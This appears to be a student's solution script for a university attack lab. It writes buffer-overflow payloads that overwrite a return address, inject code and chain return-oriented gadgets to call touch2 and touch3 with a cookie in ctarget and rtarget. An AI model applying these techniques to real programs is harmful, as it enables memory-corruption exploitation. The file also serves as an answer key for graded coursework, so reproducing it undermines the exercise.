def garbage(n):
	return 'AA ' * n

# phase 1
def phase1():
	with open('ctarget.l1', 'w') as out:
		filler = garbage(56)
		target = '62 1c 40 00 00 00 00 00'
		out.write(filler + target)

# phase 2
def phase2():
	with open('ctarget.l2', 'w') as out:
		mov = '48 c7 c7 f0 8b fd 16'
		ret = 'c3'
		filler = garbage(56 - 8)
		code = '88 c0 63 55 00 00 00 00'
		target = '90 1c 40 00 00 00 00 00'
		out.write(mov + ' ' + ret + ' ' + filler + code + ' ' + target)

# phase 3, cookie = 0x16fd8bf0
def phase3():
	with open('ctarget.l3', 'w') as out:
		mov = '48 c7 c7 d0 c0 63 55' # move cookie addr to rdi
		ret = 'c3' # return
		filler = garbage(56 - 8)
		code_addr = '88 c0 63 55 00 00 00 00' # address of injected code
		touch3_addr = '67 1d 40 00 00 00 00 00' # address of touch3 procedure
		cookie = '31 36 66 64 38 62 66 30 00' # cookie coded as ascii
		payload = '%s %s %s%s %s %s' % (mov, ret, filler, code_addr, touch3_addr, cookie)
		out.write(payload)

# phase4
def phase4():
	with open('rtarget.l2', 'w') as out:
		# filler -> popq -> cookie -> movq -> touch2
		filler = garbage(56)
		pop = '20 1e 40 00 00 00 00 00'
		cookie = 'f0 8b fd 16 00 00 00 00'
		movq = '2c 1e 40 00 00 00 00 00'
		touch2 = '90 1c 40 00 00 00 00 00'
		payload = '%s%s %s %s %s' % (filler, pop, cookie, movq, touch2)
		out.write(payload)

# phase 5
def phase5():
	with open('rtarget.l3', 'w') as out:
		filler = garbage(56)
		pop = '20 1e 40 00 00 00 00 00'
		offset = '20 00 00 00 00 00 00 00'
		eax_edx = '6f 1e 40 00 00 00 00 00'
		edx_ecx = 'f8 1e 40 00 00 00 00 00'
		ecx_esi = '06 1f 40 00 00 00 00 00'
		rsp_rax = 'c4 1e 40 00 00 00 00 00' 
		rax_rdi_1 = '2c 1e 40 00 00 00 00 00' # saved rsp
		add_xy = '37 1e 40 00 00 00 00 00'
		rax_rdi = '2c 1e 40 00 00 00 00 00'
		touch3 = '67 1d 40 00 00 00 00 00'
		cookie = '31 36 66 64 38 62 66 30 00' # saved rsp + 20
		payload = '%s%s %s %s %s %s %s %s %s %s %s %s' % (filler, pop, offset, eax_edx, edx_ecx, ecx_esi, rsp_rax, rax_rdi_1, add_xy, rax_rdi, touch3, cookie)
		out.write(payload)

#phase1()
#phase2()
#phase3()
#phase4()
phase5()
